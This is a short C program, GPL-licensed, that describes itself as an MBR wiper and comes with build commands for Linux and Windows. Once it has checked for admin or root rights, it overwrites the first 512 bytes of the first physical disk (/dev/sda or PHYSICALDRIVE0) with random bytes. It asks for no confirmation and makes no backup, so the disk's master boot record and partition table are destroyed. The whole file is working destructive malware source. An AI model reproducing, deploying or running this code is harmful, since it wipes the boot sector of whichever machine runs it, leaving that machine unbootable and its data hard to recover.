// This file implements a little MBR Wiper

/*
    Copyright (C) 2025  Maurice Lambert
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// Linux:
// gcc -Wall -Wextra -Werror -O5 MbrWiper.c -o MbrWiper

// Windows:
// gcc -Wall -Wextra -Werror -O5 MbrWiper.c -o MbrWiper.exe

#include <stdio.h>
#include <stdlib.h>

#ifdef _WIN32
#include <windows.h>
#include <wincrypt.h>
#define FILENAME "\\\\.\\PHYSICALDRIVE0"
#else
#include <unistd.h>
#include <sys/types.h>
#include <fcntl.h>
#define FILENAME "/dev/sda"
#endif

int is_root_or_admin() {
#ifdef _WIN32
    BOOL is_admin = FALSE;
    HANDLE token_handle = NULL;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token_handle)) {
        TOKEN_ELEVATION elevation;
        DWORD size = sizeof(TOKEN_ELEVATION);

        if (GetTokenInformation(token_handle, TokenElevation, &elevation, sizeof(elevation), &size)) {
            is_admin = elevation.TokenIsElevated;
        }

        CloseHandle(token_handle);
    }

    return is_admin;
#else
    return (geteuid() == 0);
#endif
}

int get_random_bytes(unsigned char *buffer, size_t length) {
#ifdef _WIN32
    HCRYPTPROV hCryptProv;

    if (!CryptAcquireContext(&hCryptProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
        fputs("Error: CryptAcquireContext failed.", stderr);
        return -1;
    }

    if (!CryptGenRandom(hCryptProv, (DWORD)length, buffer)) {
        fputs("Error: CryptGenRandom failed.", stderr);
        CryptReleaseContext(hCryptProv, 0);
        return -1;
    }

    CryptReleaseContext(hCryptProv, 0);
#else
    int fd = open("/dev/urandom", O_RDONLY);
    if (fd == -1) {
        perror("Error opening /dev/urandom");
        return -1;
    }

    ssize_t result = read(fd, buffer, length);
    if (result != (ssize_t)length) {
        perror("Error reading from /dev/urandom");
        close(fd);
        return -1;
    }

    close(fd);
#endif

    return 0;
}

int main() {
    if (!is_root_or_admin()) {
        fputs("The program is not running with elevated privileges.", stderr);
        return 1;
    }

    unsigned char random_bytes[512];
    if (get_random_bytes(random_bytes, sizeof(random_bytes)) != 0) {
        fputs("Failed to generate random bytes.", stderr);
        return 2;   
    }

    FILE *file = fopen(FILENAME, "rb+");

    if (file == NULL) {
        fputs("Error opening file", stderr);
        return 3;
    }

    size_t written = fwrite(random_bytes, 1, 512, file);

    if (written != 512) {
        fputs("Error writing to file", stderr);
        return 3;
    }

    fclose(file);

    return 0;
}